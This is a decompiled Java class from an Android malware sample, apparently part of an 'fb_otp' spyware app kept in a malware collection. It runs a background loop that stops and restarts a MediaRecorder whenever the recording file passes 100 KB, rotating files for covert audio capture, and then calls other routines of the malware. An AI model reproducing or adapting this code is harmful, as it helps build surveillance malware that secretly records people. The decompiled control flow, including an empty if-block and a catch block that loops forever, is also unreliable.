import android.media.MediaRecorder;
import java.io.File;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

public final class es
  implements Runnable
{
  public es(eq parameq) {}
  
  public final void run()
  {
    for (;;)
    {
      if (!this.a.jdField_a_of_type_JavaLangBoolean.booleanValue()) {
        return;
      }
      if (new File(this.a.jdField_a_of_type_JavaLangString).length() > 100000L) {}
      try
      {
        this.a.jdField_a_of_type_AndroidMediaMediaRecorder.stop();
        this.a.jdField_a_of_type_AndroidMediaMediaRecorder.release();
        this.a.b = this.a.jdField_a_of_type_JavaLangString;
        eq localeq1 = this.a;
        eq localeq2 = this.a;
        localeq1.jdField_a_of_type_JavaLangString = eq.a(this.a.c);
        this.a.a();
        eq.a(this.a);
        eq.b(this.a);
        try
        {
          TimeUnit.SECONDS.sleep(this.a.jdField_a_of_type_Int);
        }
        catch (InterruptedException localInterruptedException)
        {
          localInterruptedException.printStackTrace();
        }
      }
      catch (IOException localIOException)
      {
        for (;;)
        {
          localIOException.printStackTrace();
        }
      }
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/es.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */